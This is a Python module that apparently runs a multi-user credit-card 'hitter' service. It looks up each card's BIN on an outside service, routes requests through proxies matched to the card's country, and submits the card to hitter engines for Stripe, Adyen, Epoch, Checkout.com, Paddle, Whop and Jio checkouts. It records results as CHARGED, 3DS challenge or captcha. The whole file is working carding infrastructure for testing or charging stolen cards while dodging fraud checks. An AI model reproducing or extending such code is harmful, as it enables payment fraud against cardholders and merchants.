import time
import importlib
import asyncio
from typing import Dict, Optional, Any
import config
import db
import proxies as proxy_mod
from cards import brand_of
from dispatcher import detect


USER_SEMS: Dict[int, asyncio.Semaphore] = {}
GLOBAL_SEM = asyncio.Semaphore(config.GLOBAL_CONCURRENCY)


def _user_sem(uid: int) -> asyncio.Semaphore:
    if uid not in USER_SEMS:
        USER_SEMS[uid] = asyncio.Semaphore(config.PER_USER_CONCURRENCY)
    return USER_SEMS[uid]


async def _lookup_bin(card: str) -> Dict[str, str]:
    import aiohttp
    bin6 = card[:6]
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(
                f"https://bins.antipublic.cc/bins/{bin6}",
                timeout=aiohttp.ClientTimeout(total=5),
            ) as r:
                if r.status == 200:
                    d = await r.json()
                    return {
                        "country": (d.get("countrycode") or "").upper(),
                        "bank": d.get("bank", ""),
                        "brand": d.get("brand", ""),
                    }
    except Exception:
        pass
    return {"country": "", "bank": "", "brand": ""}


async def run_hit(user_id: int, url: str, card: Dict, gateway: Optional[str] = None) -> Dict[str, Any]:
    t0 = time.time()

    if gateway is None:
        gateway, _ = detect(url)
    if gateway == "unknown":
        return {
            "success": False, "status": "ERROR",
            "error": "Unsupported gateway URL", "gateway": "unknown",
            "response_time": 0, "card": card,
        }

    bin_info = await _lookup_bin(card["card"])
    proxy = await proxy_mod.pick_proxy(user_id, bin_info.get("country") or None)
    proxy_dict = proxy_mod.build_proxies_dict(proxy) if proxy else None

    engine_mod_path = f"engines.{gateway if gateway != 'stripe' else 'stripe_hit_engine'}"
    try:
        mod = importlib.import_module(engine_mod_path)
    except ImportError:
        mod = importlib.import_module("engines." + gateway + "_hitter")

    async with GLOBAL_SEM, _user_sem(user_id):
        try:
            result = await _dispatch_engine(mod, gateway, url, card, proxy_dict, user_id, proxy)
        except Exception as ex:
            result = {
                "success": False, "status": "ERROR",
                "error": f"{type(ex).__name__}: {str(ex)[:200]}",
                "gateway": gateway, "card": card,
                "response_time": round(time.time() - t0, 2),
            }

    status = result.get("status") or ("CHARGED" if result.get("success") else "DECLINED")
    if result.get("success"):
        status = "CHARGED"
    elif result.get("challenge_required") or result.get("decline_code") == "3ds_required":
        status = "3DS_CHALLENGE"
    elif result.get("is_radar_challenge"):
        status = "CAPTCHA"
    elif not result.get("error"):
        status = result.get("status") or "UNKNOWN"

    result["status"] = status
    result["gateway"] = gateway
    result["card"] = card
    result["response_time"] = result.get("response_time", round(time.time() - t0, 2))
    result["brand"] = card.get("brand") or brand_of(card["card"])
    result["bin_country"] = bin_info.get("country", "")
    result["proxy_raw"] = proxy["raw"] if proxy else None

    await db.save_hit(
        user_id=user_id, gateway=gateway, url=url,
        card=card.get("formatted", ""),
        status=status,
        decline_code=result.get("decline_code"),
        error=result.get("error"),
        response_ms=int(result["response_time"] * 1000),
        raw=result.get("raw_response") if isinstance(result.get("raw_response"), dict) else None,
        bin_country=bin_info.get("country", ""),
        brand=result["brand"],
    )
    return result


async def _dispatch_engine(mod, gateway: str, url: str, card: Dict,
                            proxy_dict: Optional[Dict],
                            user_id: int = 0,
                            proxy_data: Optional[Dict] = None) -> Dict:
    if gateway == "stripe":
        # Prefer CsHitSession (works for cs_live_ checkout URLs, no pk required upfront)
        if hasattr(mod, "CsHitSession"):
            sess = mod.CsHitSession(url, proxy=_single_proxy_str(proxy_dict))
            ok, err = await sess.open()
            if not ok:
                return {"success": False, "status": "ERROR", "error": err}
            try:
                return await sess.check_card(card)
            finally:
                await sess.close()

        # Fallback to StripeAPIHitter (invoice /i/ URLs) — now handles pk scraping itself
        import engines.stripe_hitter as sh
        hitter = sh.StripeAPIHitter(
            pk_live="", cs_live=url,
            proxy_data=_proxy_data_dict(proxy_dict),
        )
        return await hitter.hit(card, 1, user_id)

    if gateway == "adyen":
        h = mod.AdyenHitter(url, proxy_data=_proxy_data_dict(proxy_dict))
        return await h.hit(card, 1, user_id)

    if gateway == "epoch":
        h = mod.EpochHitter(url, proxy_data=_proxy_data_dict(proxy_dict))
        return await h.hit(card, 1, user_id)

    if gateway == "checkout":
        h = mod.CheckoutHitter(url, proxy_data=_proxy_data_dict(proxy_dict))
        return await h.hit(card, 1, user_id)

    if gateway == "paddle":
        h = mod.PaddleHitter(url, proxy_data=_proxy_data_dict(proxy_dict))
        return await h.hit(card, 1, user_id)

    if gateway == "whop":
        h = mod.WhopHitter(url, proxy_data=_proxy_data_dict(proxy_dict))
        return await h.hit(card, 1, user_id)

    return {"success": False, "status": "ERROR", "error": f"No engine for {gateway}"}


def _single_proxy_str(proxy_dict: Optional[Dict]) -> Optional[str]:
    if not proxy_dict:
        return None
    return proxy_dict.get("https") or proxy_dict.get("http")


def _proxy_data_dict(proxy_dict: Optional[Dict]) -> Optional[Dict]:
    if not proxy_dict:
        return None
    url = proxy_dict.get("https") or proxy_dict.get("http")
    if not url:
        return None
    from urllib.parse import urlsplit
    parts = urlsplit(url)
    d = {"server": f"{parts.scheme}://{parts.hostname}:{parts.port}", "raw": url}
    if parts.username and parts.password:
        d["username"] = parts.username
        d["password"] = parts.password
    return d


async def run_jio(user_id: int, phone: str, amount: float, card: Dict) -> Dict[str, Any]:
    import importlib
    mod = importlib.import_module("engines.jio_hitter")
    proxy = await proxy_mod.pick_proxy(user_id, "IN")
    proxy_dict = proxy_mod.build_proxies_dict(proxy) if proxy else None
    proxy_data = _proxy_data_dict(proxy_dict)

    async with GLOBAL_SEM, _user_sem(user_id):
        hitter = mod.JioHitter(phone, proxy_data=proxy_data, plan_amount=amount)
        result = await hitter.hit(card)

    status = "CHARGED" if result.get("success") else (
        "3DS_CHALLENGE" if result.get("decline_code") == "3ds_required" else "DECLINED"
    )
    result["status"] = status
    result["gateway"] = "jio"
    result["phone"] = phone
    result["amount_str"] = f"INR {amount:.2f}"
    result["brand"] = card.get("brand") or brand_of(card["card"])

    await db.save_hit(
        user_id=user_id, gateway="jio", url=f"jio://{phone}",
        card=card.get("formatted", ""), status=status,
        decline_code=result.get("decline_code"), error=result.get("error"),
        response_ms=int(result.get("response_time", 0) * 1000),
        raw=result.get("raw_response") if isinstance(result.get("raw_response"), dict) else None,
        brand=result["brand"],
    )
    return result